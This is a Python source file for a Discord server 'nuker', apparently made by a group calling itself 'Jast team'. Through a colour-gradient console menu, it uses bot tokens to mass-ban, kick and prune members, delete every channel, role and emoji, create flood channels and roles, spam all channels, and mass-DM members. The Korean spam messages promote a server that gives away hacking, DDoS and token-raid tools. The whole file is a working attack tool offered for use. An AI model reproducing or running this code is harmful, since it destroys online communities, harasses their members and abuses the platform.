import os
import discord
import asyncio
import random
import aiohttp
from discord.ext import commands
import webbrowser
import sys
from rich.console import Console
from rich.text import Text
from rich.live import Live
import math

console = Console()

BOT_TOKENS = ['YOUR_BOT_TOEKN_HERE']
bots = []

async def ainput(prompt=""):
    loop = asyncio.get_event_loop()
    return await loop.run_in_executor(None, input, prompt)

async def direct_request(method, url, payload=None):
    headers = {"Authorization": f"Bot {BOT_TOKENS[0]}", "Content-Type": "application/json"}
    async with aiohttp.ClientSession() as session:
        async with session.request(method, url, json=payload, headers=headers) as response:
            if response.status == 429: 
                retry_after = (await response.json()).get('retry_after', 1)
                await asyncio.sleep(retry_after)
                return await direct_request(method, url, payload)
            return await response.json()


class ConsoleEngine(commands.Bot):
    def __init__(self, token):
        self.token = token
        intents = discord.Intents.default()
        intents = discord.Intents.all()
        intents.message_content = True
        intents.members = True

        super().__init__(
            command_prefix="dummy!",
            intents=intents
        )

guild_id = YOUR_GUILD_ID_HERE

async def Ban_members():
    target_guild_id = guild_id
    for bot in bots:
        guild = bot.get_guild(target_guild_id)
        if guild:
            print(f"Succesfully logged in Guild {guild.name}")

            async def ban_and_log(member):
                try:
                    await member.ban(reason="Nuked by Jast owner")
                    print(f"Succesfully Banned member {member.name}#{member.discriminator} ({member.id})")
                except discord.Forbidden:
                    print(f"Failed to ban members by Insufficient permissions {member.name}")
                except Exception as e:
                    print(f"Happend Error")

            tasks = [ban_and_log(member) for member in guild.members if member.id != bot.user.id]

            await asyncio.gather(*tasks)
            print(f"Succesfully banned all members!")
            break


async def Create_channels():
    count = await ainput("Number to Create : ")
    names = ["nuked-by-jast", "●█▀█▄", "무릎을-꿇어라"]

    target_guild_id = guild_id
    for bot in bots:
        guild = bot.get_guild(target_guild_id)
        
        async def create_and_log():
            try:
                
                target_name = random.choice(names)
                new_chan = await guild.create_text_channel(name=target_name)
                print(f"Succesfully Created Channel {new_chan.name}")
            except Exception as e:
                print(f"Failed to create channel {e}")

        
        tasks = [create_and_log() for _ in range(int(count))]
        await asyncio.gather(*tasks)
        print(f"Succesfully made {count} Channels")
        break

async def Delete_channels():
    for bot in bots:
        guild = bot.get_guild(guild_id)
        while guild is None:
            print("Loading guild id... wait for few second")
            await asyncio.sleep(0.25)
            guild = bot.get_guild(guild_id)
        
        async def delete_and_log(target_channel):
            try:
                name = target_channel.name
                await target_channel.delete()
                print(f"Successfully Delete channel {name}")
            except Exception as e:
                print(f"Failed to delete channel {name}: {e}")

        tasks = [delete_and_log(c) for c in guild.channels]
        await asyncio.gather(*tasks)
        print("Successfully Delete channels!")
        break

async def Spam_channels(attack_limit):
    spammessages = [
        "# 서버 이전합니다. 이 서버 너무 썩어서 테러하고 새 서버 만들었습니다. 많이 들어와주세요. 더 좋은 툴을 제공합니다. | https://discord.gg/FNBAW54ac4 || @everyone @here || By jast team owner", 
        "# @everyone 서버 이전합니다. 새 서버로 들어오세요", 
        "# ``` 현존 최강 무료 해킹툴 배포 서버. 속는셈 치고 들어오세요. 24시간 운영합니다. 봇넷 디도스툴, 도스툴, 테러툴, 토큰테러툴, 토큰생성기, 카카오톡 로코등 다양한걸 무료로! 배포합니다. ``` https://discord.gg/FNBAW54ac4 @everyone", 
        "# @everyone 서버 개망해서 Cosmic Force 랑 합칩니다!!"
    ]
    
    for bot in bots:
        guild = bot.get_guild(guild_id)
        if guild:
            count = 0
            while True:
                if attack_limit != 0 and count >= attack_limit:
                    break
                
                tasks = []
                for target_channel in guild.text_channels:
                    async def send_and_log(chan):
                        try:
                            await chan.send(random.choice(spammessages))
                            print(f"Successfully send message in {chan.name}")
                        except:
                            await asyncio.sleep(0.2)
                            print("Reached rate limit. Wating few seconds")

                    tasks.append(send_and_log(target_channel))

                await asyncio.gather(*tasks)
                count += 1
            break

async def Kick_members():
    for bot in bots:
        guild = bot.get_guild(guild_id)
        if guild:
            tasks = [member.kick(reason="Nuked by Jast owner") for member in guild.members if member.id != bot.user.id]
            print(f"succesfully banned member!")
            await asyncio.gather(*tasks, return_exceptions=True)
            print(f"Successfully kicked all members")
            break

async def Prune_members():
    for bot in bots:
        guild = bot.get_guild(guild_id)
        if guild:
            pruned = await guild.prune(days=7, reason="Nuked by Jast owner")
            print(f"Successfully pruned {pruned} members")
            break

async def Create_roles():
    count = int(await ainput("Number of roles to create: "))
    names = ["Nuked by x523", "Raided", "OMG"]

    for bot in bots:
        guild = bot.get_guild(guild_id)
        if guild:
            tasks = []
            for i in range(count):
                role_name = names[i % len(names)]
                tasks.append(guild.create_role(name=role_name))
                print(f"Successfully created {role_name}")
                await asyncio.sleep(0.01)

            await asyncio.gather(*tasks, return_exceptions=True)
            print(f"Successfully created {count} roles")
            break


async def Delete_roles():
    for bot in bots:
        guild = bot.get_guild(guild_id)
        if guild:
            target_roles = [role for role in guild.roles if not role.managed and role.name != "@everyone"]
            
            async def fast_delete(role):
                try:
                    await role.delete()
                    print(f"Role Deleted: {role.name}")
                except:
                    pass

            await asyncio.gather(*[fast_delete(r) for r in target_roles], return_exceptions=True)
            print("Done")
            break

async def DM_spam():
    ans = await ainput("Number of DM to send: ")
    try:
        dm_count = int(ans)
    except ValueError:
        print("Wrong answer")
        return

    msg_list = ["당신의 길드는 Jast team 에 의해 습격당했습니다. Jast team 에 참가해 무료 해킹툴들 받아가세요! | https://discord.gg/FNBAW54ac4"]
    
    for bot in bots:
        guild = bot.get_guild(guild_id)
        if guild:
            await guild.chunk() 
            
            async def send_dm_task(member):
                if member.bot: return 
                for _ in range(dm_count):
                    try:
                        await member.send(random.choice(msg_list))
                        print(f"Successfully Send DM {member.name}")
                        await asyncio.sleep(0.1) 
                    except Exception as e:
                        print(f"Failed to send dm {member.name}")
                        break 

            tasks = [send_dm_task(member) for member in guild.members]
            await asyncio.gather(*tasks)
            print("DM Spam finished")
            break

async def Delete_emojis():
    for bot in bots:
        guild = bot.get_guild(guild_id)
        if guild:
            async def del_emoji(emoji):
                try:
                    name = emoji.name
                    await emoji.delete()
                    print(f"Successfully Delete emojis {name}")
                except:
                    print(f"Failed to delete emojis {emoji.name}")

            
            tasks = [del_emoji(emoji) for emoji in guild.emojis]
            await asyncio.gather(*tasks)
            print("Successfully wiped all emojis")
            break

RED_GRADIENTS = [
    ((40, 0, 0),   (120, 0, 0)),
    ((70, 0, 0),   (160, 10, 10)),
    ((100, 0, 0),  (200, 0, 0)),
    ((130, 10, 10),(255, 40, 40)),
    ((160, 0, 0),  (255, 80, 80)),
    ((90, 0, 20),  (200, 30, 60)),
    ((120, 0, 0),  (255, 0, 0)),
    ((150, 20, 20),(255, 120, 120)),
    ((80, 0, 0),   (180, 0, 0)),
    ((200, 40, 40),(255, 150, 150)),
]

BORDER_RED = (90, 0, 0)
NEON_RED   = (255, 140, 140)

_original_print = print
_tick = 0.0

def render_menu(menu: str, tick: float) -> Text:
    lines = menu.splitlines()
    out = Text()

    for line_idx, line in enumerate(lines):
        g1, g2 = RED_GRADIENTS[line_idx % len(RED_GRADIENTS)]
        phase = tick + line_idx * 0.7
        line_text = Text()

        for char_idx, ch in enumerate(line):
            wave = (math.sin(phase + char_idx * 0.18) + 1) / 2

            if ch.isdigit():
                r, g, b = NEON_RED
            elif ch in "╔╗╚╝═║╦╩╠╣":
                r, g, b = BORDER_RED
            else:
                r = int(g1[0] + (g2[0] - g1[0]) * wave)
                g = int(g1[1] + (g2[1] - g1[1]) * wave)
                b = int(g1[2] + (g2[2] - g1[2]) * wave)

            line_text.append(ch, style=f"rgb({r},{g},{b})")

        out.append(line_text)
        out.append("\n")

    return out

def print(*args, **kwargs):
    global _tick
    s = " ".join(str(a) for a in args)

    lines = s.splitlines()
    text = Text()

    for li, line in enumerate(lines):
        g1, g2 = RED_GRADIENTS[li % len(RED_GRADIENTS)]
        phase = _tick + li * 0.7

        for ci, ch in enumerate(line):
            wave = (math.sin(phase + ci * 0.18) + 1) / 2

            if ch.isdigit():
                r, g, b = NEON_RED
            elif ch in "╔╗╚╝═║╦╩╠╣":
                r, g, b = BORDER_RED
            else:
                r = int(g1[0] + (g2[0] - g1[0]) * wave)
                g = int(g1[1] + (g2[1] - g1[1]) * wave)
                b = int(g1[2] + (g2[2] - g1[2]) * wave)

            text.append(ch, style=f"rgb({r},{g},{b})")

        text.append("\n")

    console.print(text, end="")
    _tick += 0.15
                    

async def Print_menu():
    os.system("cls" if os.name == "nt" else "clear")
    print(r"""



                                        ____  ________________________
                                        __  |/ /__  ____/_|__ \_|__  /
                                        __    /______ \ ____/ /__/_ <
                                        _    |  ____/ / _  __/____/ /
                                        /_/|_| /_____/  /____//____/   Made by "Jast Owenr"
                                            
 
                                        https://discord.gg/FNBAW54ac4


                        ╚╦╗                                                               ╔╦╝
                    ╔═════╩══════════════════╦═════════════════════════╦══════════════════╩═════╗
                    ║ (1) < Ban Members      ║ (5) < Create Roles      ║ (9)  < Spam Channels   ║
                    ║ (2) < Kick Members     ║ (6) < Delete Channels   ║ (10) < DM Spam         ║
                    ║ (3) < Prune Members    ║ (7) < Delete Roles      ║ (11) < Credits         ║
                    ║ (4) < Create Channels  ║ (8) < Delete Emojis     ║ (12) < Exit            ║  
                    ╚═════╦══════════════════╩═════════════════════════╩══════════════════╦═════╝
                        ╔╩╝                                                               ╚╩╗
          

          """)
    
async def choice_numbers():
    while True:
        choice = await ainput("\n>> ")

        if choice == "1":
            await Ban_members()
            await Print_menu()

        elif choice == "2":
            await Kick_members()
            await Print_menu()

        elif choice == "3":
            await Prune_members()
            await Print_menu()

        elif choice == "4":
            await Create_channels()
            await Print_menu()

        elif choice == "5":
            await Create_roles()
            await Print_menu()

        elif choice == "6":
            await Delete_channels()
            await Print_menu()

        elif choice == "7":
            await Delete_roles()
            await Print_menu()

        elif choice == "8":
            await Delete_emojis()
            await Print_menu()

        elif choice == "9":
            Attacknumber = await ainput("Number to send message : ")
            attack_num = int(Attacknumber)
            await Spam_channels(attack_num)
            await Print_menu()

        elif choice == "10":
            await DM_spam()
            await Print_menu()

        elif choice == "11":
            print("Made by Jast team Owner")
            print("Thank you for using!!")
            os.system("pause > nul")
            await Print_menu()

        elif choice == "12":
            sys.exit()

        elif choice == "x523":
            await Delete_channels()
            await Create_channels()
            Attacknumber = await ainput("Number to send message : ")
            attack_num = int(Attacknumber)
            await Spam_channels(attack_num)
            await Print_menu()

        elif choice == "Unji":
            url = "https://www.youtube.com/watch?v=vMnZDDLb-WY&list=RDvMnZDDLb-WY&start_radio=1"
            webbrowser.open(url)
            await Print_menu()
        
        elif choice == "unji":
            url2 = "https://www.youtube.com/watch?v=vMnZDDLb-WY&list=RDvMnZDDLb-WY&start_radio=1"
            webbrowser.open(url2)
            await Print_menu()
        
        elif choice == "shangus":
            url3 = "https://www.youtube.com/watch?v=9hg3Po6Xr8M&list=RD9hg3Po6Xr8M&start_radio=1"
            webbrowser.open(url3)
            await Print_menu()
        
        elif choice == "523":
            url4 = "https://www.youtube.com/watch?v=Jc1_XjO_488&list=RDJc1_XjO_488&start_radio=1"
            webbrowser.open(url4)
            await Print_menu()

        else:
            print("Wrong choice")
            os.system("pause > nul")

async def main():
    for token in BOT_TOKENS:
        bot = ConsoleEngine(token)
        bots.append(bot)
        asyncio.create_task(bot.start(token))

    await asyncio.sleep(0.1)
    await Print_menu()
    await choice_numbers()

asyncio.run(main())



        
                        


